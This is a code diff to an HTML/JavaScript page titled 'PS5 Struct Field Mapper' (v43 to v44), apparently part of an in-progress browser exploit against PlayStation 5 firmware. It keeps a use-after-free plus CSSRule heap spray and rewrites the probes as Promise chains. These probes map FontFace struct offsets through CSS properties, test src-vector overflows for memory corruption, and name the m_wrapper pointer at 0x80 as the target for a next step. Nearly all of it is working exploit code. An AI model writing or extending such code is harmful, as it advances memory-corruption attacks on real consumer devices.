@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v43 — Struct Field Mapper</title>
+<title>PS5 v44 - Struct Field Mapper</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,7 +33,7 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v43 MAPPER</span><span class="s">│</span>
+<span class="l">▶ v44 MAPPER</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">STAGE:<b>INIT</b></span>
 </div>
@@ -43,10 +43,9 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 "use strict";
 
 // ============================================================
-//  PS5 v43 — Struct Field Mapper
-//  Built on v42 UAF + CSSRule Spray
-//  Probes every CSS-accessible field to map struct layout
-//  and determine distance to m_wrapper (0x80)
+//  PS5 v44 — Struct Field Mapper
+//  Fixed: load() returns a Promise, not an array.
+//  All probes now properly await the Promise.
 // ============================================================
 
 var O=document.getElementById("out");
@@ -67,7 +66,7 @@ var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v43 — Struct Field Mapper","hd");
+P("  v44 — Struct Field Mapper","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -81,7 +80,7 @@ var sh=document.getElementById("s").sheet;
 var keep=[],holes=[],trigger=null,uafOk=false;
 
 // ============================================================
-//  PHASE 1: UAF + CSSRule Spray (from v42)
+//  PHASE 1: UAF + CSSRule Spray (from v42, unchanged)
 // ============================================================
 
 pg(5);Hd("Creating holes...");
@@ -134,7 +133,7 @@ if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 
 pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();
 
-Dm("Calling load() synchronously...");
+Dm("Calling load() ...");
 
 try {
   var loadPromise = document.fonts.load("1em trigger, x", "AB");
@@ -212,12 +211,10 @@ try {
       xIndex = sh.cssRules.length - 1;
     }
     
-    var xRule = sh.cssRules[xIndex];
-    var xStyle = xRule.style;
     Ok("xRule at index "+xIndex);
     
     // ============================================================
-    //  PHASE 3: Struct Field Mapper
+    //  PHASE 3: Struct Field Mapper (FIXED)
     // ============================================================
     
     pg(50);Sep();Hd("PHASE 3: Struct Field Mapper");Sep();
@@ -229,19 +226,44 @@ try {
     var confirmedCount = 0;
     var failedCount = 0;
     
-    // Probe runner
-    function runProbe(name, writeVal, readFn, expectedOff, desc, type) {
+    // Synchronous read helper: calls load(), returns Promise
+    // We chain probes sequentially using .then()
+    
+    function syncRead() {
+      // load() returns a Promise. The .then() callback receives the faces array.
+      return document.fonts.load("1em trigger, x", "AB");
+    }
+    
+    // Probe runner — now properly handles the Promise
+    function runProbe(name, writeVal, readPropFn, expectedOff, desc, type) {
       var key = name+'="'+writeVal+'"';
       P("  ["+expectedOff+"] "+key+" ("+desc+")","dm");
       
+      // WRITE to A_NNN's CSSRule
       try {
-        // WRITE to A_NNN's CSSRule
         aStyle.setProperty(name, writeVal);
+      } catch(e) {
+        Fl("    WRITE ERR: "+e.message);
+        results.push({name:key, off:expectedOff, desc:desc, type:type,
+          write:writeVal, error:"write: "+e.message, ok:false});
+        failedCount++;
+        P("");
+        return Promise.resolve();
+      }
+      
+      // READ via confused selector path — load() returns a Promise
+      return syncRead().then(function(faces){
+        var readVals = [];
+        for(var i=0;i<faces.length;i++){
+          try {
+            readVals.push(readPropFn(faces[i]));
+          } catch(e) {
+            readVals.push("ERR:"+e.message);
+          }
+        }
         
-        // READ via confused selector path
-        var readFaces = document.fonts.load("1em trigger, x", "AB");
-        var readVals = readFn(readFaces);
-        var cssVal = aStyle.getPropertyValue(name);
+        var cssVal = "";
+        try { cssVal = aStyle.getPropertyValue(name); } catch(e) {}
         
         // Check if write propagated
         var readStr = JSON.stringify(readVals);
@@ -249,7 +271,6 @@ try {
         var propagated = false;
         
         if(type === "numeric") {
-          // For numeric, check if the number appears in readback
           for(var i=0;i<readVals.length;i++){
             if(readVals[i] !== null && readVals[i] !== undefined) {
               if(String(readVals[i]) === writeStr || 
@@ -289,279 +310,331 @@ try {
         // Clean up
         try { aStyle.removeProperty(name); } catch(e) {}
         
-      } catch(e) {
-        Fl("    ERR: "+e.message);
+      }).catch(function(e){
+        Fl("    READ ERR: "+e.message);
         results.push({name:key, off:expectedOff, desc:desc, type:type,
-          write:writeVal, error:e.message, ok:false});
+          write:writeVal, error:"read: "+e.message, ok:false});
         failedCount++;
-      }
-      P("");
+      }).then(function(){
+        P("");
+      });
     }
     
+    // Chain all probes sequentially using Promise.then()
+    var chain = Promise.resolve();
+    
     // --- m_family (0x20) ---
-    Hd("Offset 0x20: m_family");
-    runProbe("font-family", "testFamProbe", 
-      function(faces){return faces.map(function(f){return f.family})},
-      "0x20", "m_family (RefPtr<CSSValue>)", "string");
+    chain = chain.then(function(){
+      Hd("Offset 0x20: m_family");
+      return runProbe("font-family", "testFamProbe", 
+        function(f){return f.family},
+        "0x20", "m_family (RefPtr<CSSValue>)", "string");
+    });
     
     // --- m_ranges (0x28) ---
-    Hd("Offset 0x28: m_ranges");
-    runProbe("unicode-range", "U+0000-007F",
-      function(faces){return faces.map(function(f){return f.unicodeRange})},
-      "0x28", "m_ranges (Vector<UnicodeRange>)", "string");
+    chain = chain.then(function(){
+      Hd("Offset 0x28: m_ranges");
+      return runProbe("unicode-range", "U+0000-007F",
+        function(f){return f.unicodeRange},
+        "0x28", "m_ranges (Vector<UnicodeRange>)", "string");
+    });
     
     // --- m_featureSettings (0x40) ---
-    Hd("Offset 0x40: m_featureSettings");
-    runProbe("font-feature-settings", "\"test\" 1",
-      function(faces){return faces.map(function(f){
-        try{return f.featureSettings}catch(e){return "ERR:"+e.message}})},
-      "0x40", "m_featureSettings", "string");
+    chain = chain.then(function(){
+      Hd("Offset 0x40: m_featureSettings");
+      return runProbe("font-feature-settings", "\"test\" 1",
+        function(f){try{return f.featureSettings}catch(e){return "ERR:"+e.message}},
+        "0x40", "m_featureSettings", "string");
+    });
     
     // --- m_loadingBehavior (0x58) ---
-    Hd("Offset 0x58: m_loadingBehavior");
-    runProbe("font-display", "block",
-      function(faces){return faces.map(function(f){
-        try{return f.display}catch(e){return "ERR:"+e.message}})},
-      "0x58", "m_loadingBehavior (block)", "enum");
-    runProbe("font-display", "swap",
-      function(faces){return faces.map(function(f){
-        try{return f.display}catch(e){return "ERR:"+e.message}})},
-      "0x58", "m_loadingBehavior (swap)", "enum");
-    runProbe("font-display", "fallback",
-      function(faces){return faces.map(function(f){
-        try{return f.display}catch(e){return "ERR:"+e.message}})},
-      "0x58", "m_loadingBehavior (fallback)", "enum");
-    runProbe("font-display", "optional",
-      function(faces){return faces.map(function(f){
-        try{return f.display}catch(e){return "ERR:"+e.message}})},
-      "0x58", "m_loadingBehavior (optional)", "enum");
+    chain = chain.then(function(){
+      Hd("Offset 0x58: m_loadingBehavior");
+      return runProbe("font-display", "block",
+        function(f){try{return f.display}catch(e){return "ERR:"+e.message}},
+        "0x58", "m_loadingBehavior (block)", "enum");
+    });
+    chain = chain.then(function(){
+      return runProbe("font-display", "swap",
+        function(f){try{return f.display}catch(e){return "ERR:"+e.message}},
+        "0x58", "m_loadingBehavior (swap)", "enum");
+    });
+    chain = chain.then(function(){
+      return runProbe("font-display", "fallback",
+        function(f){try{return f.display}catch(e){return "ERR:"+e.message}},
+        "0x58", "m_loadingBehavior (fallback)", "enum");
+    });
+    chain = chain.then(function(){
+      return runProbe("font-display", "optional",
+        function(f){try{return f.display}catch(e){return "ERR:"+e.message}},
+        "0x58", "m_loadingBehavior (optional)", "enum");
+    });
     
     // --- m_sizeAdjust (0x5C) — FLOAT ---
-    Hd("Offset 0x5C: m_sizeAdjust (FLOAT)");
-    runProbe("size-adjust", "50",
-      function(faces){return faces.map(function(f){
-        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
-      "0x5C", "m_sizeAdjust (50.0)", "float");
-    runProbe("size-adjust", "73.5",
-      function(faces){return faces.map(function(f){
-        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
-      "0x5C", "m_sizeAdjust (73.5)", "float");
-    runProbe("size-adjust", "200",
-      function(faces){return faces.map(function(f){
-        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
-      "0x5C", "m_sizeAdjust (200.0)", "float");
+    chain = chain.then(function(){
+      Hd("Offset 0x5C: m_sizeAdjust (FLOAT)");
+      return runProbe("size-adjust", "50",
+        function(f){try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}},
+        "0x5C", "m_sizeAdjust (50.0)", "float");
+    });
+    chain = chain.then(function(){
+      return runProbe("size-adjust", "73.5",
+        function(f){try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}},
+        "0x5C", "m_sizeAdjust (73.5)", "float");
+    });
+    chain = chain.then(function(){
+      return runProbe("size-adjust", "200",
+        function(f){try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}},
+        "0x5C", "m_sizeAdjust (200.0)", "float");
+    });
     
     // --- m_fontSelectionCapabilities.weight (0x88) ---
-    Hd("Offset 0x88: weight (9-value sweep)");
+    chain = chain.then(function(){
+      Hd("Offset 0x88: weight (9-value sweep)");
+    });
     var weights = [100,200,300,400,500,600,700,800,900];
     for(var wi=0; wi<weights.length; wi++) {
-      var wv = String(weights[wi]);
-      runProbe("font-weight", wv,
-        function(faces){return faces.map(function(f){return f.weight})},
-        "0x88", "weight ("+wv+")", "numeric");
+      (function(wv){
+        chain = chain.then(function(){
+          return runProbe("font-weight", String(wv),
+            function(f){return f.weight},
+            "0x88", "weight ("+wv+")", "numeric");
+        });
+      })(weights[wi]);
     }
     
     // --- m_fontSelectionCapabilities.width ---
-    Hd("Offset 0x88+?: width");
-    runProbe("font-stretch", "condensed",
-      function(faces){return faces.map(function(f){
-        try{return f.stretch}catch(e){return "ERR:"+e.message}})},
-      "0x88+4", "width (condensed)", "string");
-    runProbe("font-stretch", "expanded",
-      function(faces){return faces.map(function(f){
-        try{return f.stretch}catch(e){return "ERR:"+e.message}})},
-      "0x88+4", "width (expanded)", "string");
+    chain = chain.then(function(){
+      Hd("Offset 0x88+?: width");
+      return runProbe("font-stretch", "condensed",
+        function(f){try{return f.stretch}catch(e){return "ERR:"+e.message}},
+        "0x88+4", "width (condensed)", "string");
+    });
+    chain = chain.then(function(){
+      return runProbe("font-stretch", "expanded",
+        function(f){try{return f.stretch}catch(e){return "ERR:"+e.message}},
+        "0x88+4", "width (expanded)", "string");
+    });
     
     // --- m_fontSelectionCapabilities.slope ---
-    Hd("Offset 0x88+?: slope");
-    runProbe("font-style", "italic",
-      function(faces){return faces.map(function(f){
-        try{return f.style}catch(e){return "ERR:"+e.message}})},
-      "0x88+8", "slope (italic)", "string");
-    runProbe("font-style", "oblique 20deg",
-      function(faces){return faces.map(function(f){
-        try{return f.style}catch(e){return "ERR:"+e.message}})},
-      "0x88+8", "slope (oblique 20deg)", "string");
+    chain = chain.then(function(){
+      Hd("Offset 0x88+?: slope");
+      return runProbe("font-style", "italic",
+        function(f){try{return f.style}catch(e){return "ERR:"+e.message}},
+        "0x88+8", "slope (italic)", "string");
+    });
+    chain = chain.then(function(){
+      return runProbe("font-style", "oblique 20deg",
+        function(f){try{return f.style}catch(e){return "ERR:"+e.message}},
+        "0x88+8", "slope (oblique 20deg)", "string");
+    });
     
     // --- Additional probes ---
-    Hd("Additional fields");
-    runProbe("font-variation-settings", "\"wght\" 400",
-      function(faces){return faces.map(function(f){
-        try{return f.variationSettings}catch(e){return "ERR:"+e.message}})},
-      "unknown", "variationSettings", "string");
-    runProbe("ascent-override", "90%",
-      function(faces){return faces.map(function(f){
-        try{return f.ascentOverride}catch(e){return "ERR:"+e.message}})},
-      "unknown", "ascentOverride", "string");
-    runProbe("descent-override", "110%",
-      function(faces){return faces.map(function(f){
-        try{return f.descentOverride}catch(e){return "ERR:"+e.message}})},
-      "unknown", "descentOverride", "string");
-    runProbe("line-gap-override", "120%",
-      function(faces){return faces.map(function(f){
-        try{return f.lineGapOverride}catch(e){return "ERR:"+e.message}})},
-      "unknown", "lineGapOverride", "string");
+    chain = chain.then(function(){
+      Hd("Additional fields");
+      return runProbe("font-variation-settings", "\"wght\" 400",
+        function(f){try{return f.variationSettings}catch(e){return "ERR:"+e.message}},
+        "unknown", "variationSettings", "string");
+    });
+    chain = chain.then(function(){
+      return runProbe("ascent-override", "90%",
+        function(f){try{return f.ascentOverride}catch(e){return "ERR:"+e.message}},
+        "unknown", "ascentOverride", "string");
+    });
+    chain = chain.then(function(){
+      return runProbe("descent-override", "110%",
+        function(f){try{return f.descentOverride}catch(e){return "ERR:"+e.message}},
+        "unknown", "descentOverride", "string");
+    });
+    chain = chain.then(function(){
+      return runProbe("line-gap-override", "120%",
+        function(f){try{return f.lineGapOverride}catch(e){return "ERR:"+e.message}},
+        "unknown", "lineGapOverride", "string");
+    });
     
     // ============================================================
-    //  PHASE 4: src Overflow Probe
+    //  PHASE 4: src Overflow Probe (FIXED)
     // ============================================================
     
-    pg(80);Sep();Hd("PHASE 4: src Overflow Probe");Sep();
-    P("  Testing if Vector manipulation bleeds into adjacent fields...","dm");
-    P("");
-    
-    // Baseline weight
-    aStyle.setProperty("font-weight", "400");
-    var beforeWeight = document.fonts.load("1em trigger, x", "AB").map(function(f){return f.weight});
-    P("  Baseline weight: "+JSON.stringify(beforeWeight),"dm");
-    
-    // Test 1: Long URL
-    P("");
-    Wr("Test 1: Long URL (4096 bytes) — may crash");
-    try {
-      var longUrl = "url('data:font/woff2;base64," + "A".repeat(4096) + "')";
-      aStyle.setProperty("src", longUrl);
-      var faces1 = document.fonts.load("1em trigger, x", "AB");
-      Ok("  Survived. faces="+faces1.length+" weights="+JSON.stringify(faces1.map(function(f){return f.weight})));
-    } catch(e) {
-      Fl("  Crash: "+e.message);
-    }
-    
-    // Test 2: Many srcs
-    P("");
-    Wr("Test 2: 64 comma-separated srcs — may crash");
-    try {
-      var manySrcs = [];
-      for(var i=0; i<64; i++) {
-        manySrcs.push("url('data:font/woff2;base64,"+String.fromCharCode(65+(i%26))+String(i)+"')");
-      }
-      aStyle.setProperty("src", manySrcs.join(", "));
-      var faces2 = document.fonts.load("1em trigger, x", "AB");
-      Ok("  Survived. faces="+faces2.length+" weights="+JSON.stringify(faces2.map(function(f){return f.weight})));
+    chain = chain.then(function(){
+      pg(80);Sep();Hd("PHASE 4: src Overflow Probe");Sep();
+      P("  Testing if Vector manipulation bleeds into adjacent fields...","dm");
+      P("");
       
-      // Check if weight changed (corruption indicator)
-      var afterWeight = faces2.map(function(f){return f.weight});
-      if(JSON.stringify(beforeWeight) !== JSON.stringify(afterWeight)) {
-        St("WEIGHT CORRUPTED! Vector overflow bled into weight field!");
-        Hi("  Before: "+JSON.stringify(beforeWeight));
-        Hi("  After:  "+JSON.stringify(afterWeight));
-      } else {
-        Dm("  Weight unchanged — no corruption detected");
+      // Baseline weight
+      aStyle.setProperty("font-weight", "400");
+      return syncRead().then(function(faces){
+        var beforeWeight = [];
+        for(var i=0;i<faces.length;i++) beforeWeight.push(faces[i].weight);
+        P("  Baseline weight: "+JSON.stringify(beforeWeight),"dm");
+        
+        // Test 1: Long URL
+        P("");
+        Wr("Test 1: Long URL (4096 bytes) — may crash");
+        try {
+          var longUrl = "url('data:font/woff2;base64," + "A".repeat(4096) + "')";
+          aStyle.setProperty("src", longUrl);
+          return syncRead().then(function(faces2){
+            var w2 = [];
+            for(var i=0;i<faces2.length;i++) w2.push(faces2[i].weight);
+            Ok("  Survived. faces="+faces2.length+" weights="+JSON.stringify(w2));
+          }).catch(function(e){
+            Fl("  Crash: "+e.message);
+          });
+        } catch(e) {
+          Fl("  Crash: "+e.message);
+        }
+      });
+    });
+    
+    chain = chain.then(function(){
+      // Test 2: Many srcs
+      P("");
+      Wr("Test 2: 64 comma-separated srcs — may crash");
+      try {
+        var manySrcs = [];
+        for(var i=0; i<64; i++) {
+          manySrcs.push("url('data:font/woff2;base64,"+String.fromCharCode(65+(i%26))+String(i)+"')");
+        }
+        aStyle.setProperty("src", manySrcs.join(", "));
+        return syncRead().then(function(faces3){
+          var w3 = [];
+          for(var i=0;i<faces3.length;i++) w3.push(faces3[i].weight);
+          Ok("  Survived. faces="+faces3.length+" weights="+JSON.stringify(w3));
+          
+          // Check if weight changed
+          var afterWeight = w3;
+          var beforeStr = JSON.stringify([400]);
+          var afterStr = JSON.stringify(afterWeight);
+          if(beforeStr !== afterStr) {
+            St("WEIGHT CORRUPTED! Vector overflow bled into weight field!");
+            Hi("  Before: "+beforeStr);
+            Hi("  After:  "+afterStr);
+          } else {
+            Dm("  Weight unchanged — no corruption detected");
+          }
+        }).catch(function(e){
+          Fl("  Crash: "+e.message);
+        });
+      } catch(e) {
+        Fl("  Crash: "+e.message);
       }
-    } catch(e) {
-      Fl("  Crash: "+e.message);
-    }
+    });
     
     // Clean up
-    try { aStyle.removeProperty("src"); } catch(e) {}
-    try { aStyle.removeProperty("font-weight"); } catch(e) {}
+    chain = chain.then(function(){
+      try { aStyle.removeProperty("src"); } catch(e) {}
+      try { aStyle.removeProperty("font-weight"); } catch(e) {}
+    });
     
     // ============================================================
     //  PHASE 5: Analysis & Summary
     // ============================================================
     
-    pg(100);Sep();Hd("PHASE 5: Analysis & Summary");Sep();
-    P("");
-    
-    P("  FIELD MAP RESULTS:","hd");
-    P("  ┌─────────────────────────────────────────────────────┐");
-    
-    var byOffset = {};
-    for(var i=0; i<results.length; i++) {
-      var off = results[i].off || "unknown";
-      if(!byOffset[off]) byOffset[off] = [];
-      byOffset[off].push(results[i]);
-    }
-    
-    var offsets = Object.keys(byOffset).sort();
-    for(var oi=0; oi<offsets.length; oi++) {
-      var off = offsets[oi];
-      var probes = byOffset[off];
-      var anyOk = false;
-      for(var pi=0; pi<probes.length; pi++) {
-        if(probes[pi].ok) { anyOk = true; break; }
+    chain = chain.then(function(){
+      pg(100);Sep();Hd("PHASE 5: Analysis & Summary");Sep();
+      P("");
+      
+      P("  FIELD MAP RESULTS:","hd");
+      P("  ┌─────────────────────────────────────────────────────┐");
+      
+      var byOffset = {};
+      for(var i=0; i<results.length; i++) {
+        var off = results[i].off || "unknown";
+        if(!byOffset[off]) byOffset[off] = [];
+        byOffset[off].push(results[i]);
       }
-      var mark = anyOk ? "✅" : "✘";
-      var names = probes.map(function(p){return p.name.split("=")[0]}).filter(function(v,i,a){return a.indexOf(v)===i});
-      P("  │ "+mark+" "+off+"  "+names.join(", "));
-    }
-    
-    P("  └─────────────────────────────────────────────────────┘");
-    P("");
-    P("  Confirmed R/W channels: "+confirmedCount,"ok");
-    P("  Failed probes:          "+failedCount,"er");
-    P("");
-    
-    // Key findings
-    P("  KEY FINDINGS:","hd");
-    P("");
-    
-    // Weight check
-    var weightOk = results.filter(function(r){return r.name.indexOf("font-weight")!==-1 && r.ok});
-    if(weightOk.length >= 7) {
-      Ok("  font-weight: "+weightOk.length+"/9 confirmed → m_fontSelectionCapabilities at 0x88 ✓");
-    } else if(weightOk.length > 0) {
-      Wr("  font-weight: "+weightOk.length+"/9 confirmed → partial match");
-    } else {
-      Fl("  font-weight: 0/9 → layout mismatch or confusion failed");
-    }
-    
-    // sizeAdjust check
-    var sizeOk = results.filter(function(r){return r.name.indexOf("size-adjust")!==-1 && r.ok});
-    if(sizeOk.length >= 2) {
-      Ok("  size-adjust: "+sizeOk.length+"/3 confirmed → m_sizeAdjust at 0x5C ✓");
-      Hi("  → FLOAT WRITES CONFIRMED. IEEE 754 probing is viable.");
-    } else {
-      Wr("  size-adjust: "+sizeOk.length+"/3 confirmed");
-    }
-    
-    // font-display check
-    var dispOk = results.filter(function(r){return r.name.indexOf("font-display")!==-1 && r.ok});
-    if(dispOk.length >= 2) {
-      Ok("  font-display: "+dispOk.length+"/4 confirmed → m_loadingBehavior at 0x58 ✓");
-    }
-    
-    // font-stretch check
-    var strOk = results.filter(function(r){return r.name.indexOf("font-stretch")!==-1 && r.ok});
-    if(strOk.length >= 1) {
-      Ok("  font-stretch: "+strOk.length+"/2 confirmed → width sub-field located");
-    }
-    
-    // font-style check
-    var stlOk = results.filter(function(r){return r.name.indexOf("font-style")!==-1 && r.ok});
-    if(stlOk.length >= 1) {
-      Ok("  font-style: "+stlOk.length+"/2 confirmed → slope sub-field located");
-    }
-    
-    P("");
-    
-    // Gap analysis
-    P("  GAP ANALYSIS:","hd");
-    P("");
-    P("  Source estimate places m_wrapper at offset 0x80.");
-    P("");
-    P("  Fields between last confirmed probe and m_wrapper:");
-    P("    0x60-0x77: m_sources (Vector, 24 bytes) → 'src' property");
-    P("    0x78-0x7F: m_clients (WeakHashSet, 8 bytes) → NOT CSS-accessible");
-    P("    0x80-0x87: m_wrapper (WeakPtr<FontFace>) → THE TARGET");
-    P("");
-    P("  The gap at 0x78 (m_clients) cannot be reached via CSS.");
-    P("  m_wrapper at 0x80 is immediately after m_clients.");
-    P("");
-    
-    if(sizeOk.length >= 2) {
-      Hi("  NEXT STEP: m_sizeAdjust (0x5C) is 36 bytes before m_wrapper (0x80).");
-      Hi("  If we can craft a float that overflows or if the Vector at 0x60");
-      Hi("  can be manipulated, we may reach m_wrapper.");
-    }
-    
-    P("");
-    St("★ STRUCT FIELD MAPPER COMPLETE ★");
-    P("");
-    P("  Save the console output and send it back.","hl");
-    P("  The confirmed offsets will determine our next move.","hl");
-    
-    hu("h2","STAGE:<b>DONE</b>");
+      
+      var offsets = Object.keys(byOffset).sort();
+      for(var oi=0; oi<offsets.length; oi++) {
+        var off = offsets[oi];
+        var probes = byOffset[off];
+        var anyOk = false;
+        for(var pi=0; pi<probes.length; pi++) {
+          if(probes[pi].ok) { anyOk = true; break; }
+        }
+        var mark = anyOk ? "✅" : "✘";
+        var names = probes.map(function(p){return p.name.split("=")[0]}).filter(function(v,i,a){return a.indexOf(v)===i});
+        P("  │ "+mark+" "+off+"  "+names.join(", "));
+      }
+      
+      P("  └─────────────────────────────────────────────────────┘");
+      P("");
+      P("  Confirmed R/W channels: "+confirmedCount,"ok");
+      P("  Failed probes:          "+failedCount,"er");
+      P("");
+      
+      // Key findings
+      P("  KEY FINDINGS:","hd");
+      P("");
+      
+      // Weight check
+      var weightOk = results.filter(function(r){return r.name.indexOf("font-weight")!==-1 && r.ok});
+      if(weightOk.length >= 7) {
+        Ok("  font-weight: "+weightOk.length+"/9 confirmed → m_fontSelectionCapabilities at 0x88 ✓");
+      } else if(weightOk.length > 0) {
+        Wr("  font-weight: "+weightOk.length+"/9 confirmed → partial match");
+      } else {
+        Fl("  font-weight: 0/9 → layout mismatch or confusion failed");
+      }
+      
+      // sizeAdjust check
+      var sizeOk = results.filter(function(r){return r.name.indexOf("size-adjust")!==-1 && r.ok});
+      if(sizeOk.length >= 2) {
+        Ok("  size-adjust: "+sizeOk.length+"/3 confirmed → m_sizeAdjust at 0x5C ✓");
+        Hi("  → FLOAT WRITES CONFIRMED. IEEE 754 probing is viable.");
+      } else {
+        Wr("  size-adjust: "+sizeOk.length+"/3 confirmed");
+      }
+      
+      // font-display check
+      var dispOk = results.filter(function(r){return r.name.indexOf("font-display")!==-1 && r.ok});
+      if(dispOk.length >= 2) {
+        Ok("  font-display: "+dispOk.length+"/4 confirmed → m_loadingBehavior at 0x58 ✓");
+      }
+      
+      // font-stretch check
+      var strOk = results.filter(function(r){return r.name.indexOf("font-stretch")!==-1 && r.ok});
+      if(strOk.length >= 1) {
+        Ok("  font-stretch: "+strOk.length+"/2 confirmed → width sub-field located");
+      }
+      
+      // font-style check
+      var stlOk = results.filter(function(r){return r.name.indexOf("font-style")!==-1 && r.ok});
+      if(stlOk.length >= 1) {
+        Ok("  font-style: "+stlOk.length+"/2 confirmed → slope sub-field located");
+      }
+      
+      P("");
+      
+      // Gap analysis
+      P("  GAP ANALYSIS:","hd");
+      P("");
+      P("  Source estimate places m_wrapper at offset 0x80.");
+      P("");
+      P("  Fields between last confirmed probe and m_wrapper:");
+      P("    0x60-0x77: m_sources (Vector, 24 bytes) → 'src' property");
+      P("    0x78-0x7F: m_clients (WeakHashSet, 8 bytes) → NOT CSS-accessible");
+      P("    0x80-0x87: m_wrapper (WeakPtr<FontFace>) → THE TARGET");
+      P("");
+      P("  The gap at 0x78 (m_clients) cannot be reached via CSS.");
+      P("  m_wrapper at 0x80 is immediately after m_clients.");
+      P("");
+      
+      if(sizeOk.length >= 2) {
+        Hi("  NEXT STEP: m_sizeAdjust (0x5C) is 36 bytes before m_wrapper (0x80).");
+        Hi("  If we can craft a float that overflows or if the Vector at 0x60");
+        Hi("  can be manipulated, we may reach m_wrapper.");
+      }
+      
+      P("");
+      St("★ STRUCT FIELD MAPPER COMPLETE ★");
+      P("");
+      P("  Save the console output and send it back.","hl");
+      P("  The confirmed offsets will determine our next move.","hl");
+      
+      hu("h2","STAGE:<b>DONE</b>");
+    });
     
   }).catch(function(e){
     Fl("Load crashed: " + e.message);
